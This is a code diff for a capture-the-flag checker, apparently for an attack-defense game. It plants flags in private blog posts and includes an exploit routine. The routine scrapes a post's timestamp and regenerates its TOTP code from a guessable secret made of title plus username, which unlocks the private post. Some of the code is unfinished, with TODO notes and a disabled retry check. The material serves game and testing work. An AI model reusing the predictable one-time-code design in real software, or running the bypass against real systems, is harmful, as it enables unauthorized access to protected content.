@@ -3,7 +3,8 @@ import os
 import re
 import secrets
 import string
-import subprocess
+import hashlib
+import hmac
 from itertools import zip_longest
 from logging import LoggerAdapter
 from typing import List, Optional, Tuple
@@ -109,10 +110,10 @@ async def create_blogpost(client, cookie, flag, is_private, is_hidden, invitedus
     inviteduser = ""
     formdata = {"title": title, "body": body, "inviteuser": inviteduser}
     if is_private:
-        formdata["is_private"] = "True"
+        formdata["private"] = "True"
 
     if is_hidden:
-        formdata["is_hidden"] = "True"
+        formdata["hidden"] = "True"
 
     r = await client.post("/create", data=formdata, cookies=cookie)
     # follow redirect
@@ -148,6 +149,7 @@ async def putflag_zero(
     title, postid = await create_blogpost(client, cookie, flag, is_private=True, is_hidden=False, inviteduser="")
 
     await db.set("nec_info", (username, password, secret, title, postid))
+    # TODO: only providing the title should suffice
     attackinfo = {"title": title, "postid": postid}
     return json.dumps(attackinfo)
 
@@ -177,25 +179,29 @@ async def getflag_zero(
     assert_in(task.flag, r.text, "The flag could not be retrieved in the getflag method.")
     return
 
-def find_params(r, username, postid):
-    html = BeautifulSoup(r.text, "html.parser")
-    el_article = html.find_all('article', attrs={"class":"post"})
-    for article in el_article:
-        el_div = article.find("div", attrs={"class":"about"})
-        spliddy = el_div.string.split(' ')
-        name = spliddy[1]
-        time = spliddy[-1]
-        if name == username:
-            el_a = article.find('a', attrs={"class":"action"})
-            post_id = el_a['href'].split('/')[-1]
-            if str(postid) == str(post_id):
-                return time
-            else:
-                continue
-    raise MumbleException("post could not be found")
+#find timestamp and postid for post given by title
+def find_params(r, username, postid, title):
+    try:
+        html = BeautifulSoup(r.text, "html.parser")
+        el_article = html.find_all('article', attrs={"class":"post"})
+        for article in el_article:
+            el_h1 = article.find('h1')
+            if el_h1.string == title:
+                el_div = article.find("div", attrs={"class":"about"})
+                spliddy = el_div.string.split(' ')
+                name = spliddy[1]
+                time = spliddy[-2:]
+                el_a = article.find('a', attrs={"class":"action"})
+                post_id = el_a['href'].split('/')[-1]
+                return time, post_id
+    except: 
+        msg = f"post with id {postid} could not be found"
+        raise MumbleException(msg)
 
-def convert_str_to_unixtimestamp(timestr: str):
-    date, timec = timestr.split(' ', 1)
+def convert_str_to_unixtimestamp(time):
+    #date, timec = timestr.split(' ', 1)
+    date = time[0]
+    timec = time[1]
     datecomp=date.split('-')
     #timec = timec.split('.', 1)[0]
     timecomp=timec.split(':')
@@ -220,29 +226,30 @@ async def exploit_zero(task: ExploitCheckerTaskMessage,
     """
     if task.attack_info == "":
         raise InternalErrorException("Missing attack info for exploit")
-    attackinfo = task.attack_info
+    attackinfo = json.loads(task.attack_info)
     title = attackinfo['title']
     postid = attackinfo['postid']
-
     username, password, secret = await register_user(task, client, logger)
     cookie = await login_user(task, client,logger, username, password)
 
     #access the index, identify post through unique title and gather necessary infos
     r = await client.get("/", cookies=cookie)
     postkey = title + username
-    time = find_params(r, username, postid)
+    # use the title to find relevant info
+    time, post_id = find_params(r, username, postid, title)
     #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
     timestamp = convert_str_to_unixtimestamp(time)
     for i in range(2):
         totp_device = Totp_Client(init_time=timestamp)
         totp_device.generate_shared_secret(postkey)
         totp_device.calculate_current_timestep_count()
-        usercode = totp_device.generate_otp(self.secret_key, self.timestep_counter)
-        url = url + "auth/accessblogpost/postid"
-        r = await client.post(url, json={"code":usercode}, cookies=cookie)
-        if r.status_code == 200:
-            break
-        timestamp = int(timestamp) + 30
+        usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter+i)
+        r = await client.post("auth/accessblogpost/"+ str(post_id), data={"code":usercode}, cookies=cookie)
+        #TODO status code is alwyas 200, ned to parse html instead to find out whether the title has become available
+        #if r.status_code == 200:
+         #   break
+
+        #timestamp = int(timestamp) + 30
 
     assert_equals(r.status_code, 200, "Wrong status code in exploit function, @totp")
     assert_in(task.flag, r.text, "flag was not found in blogpost")
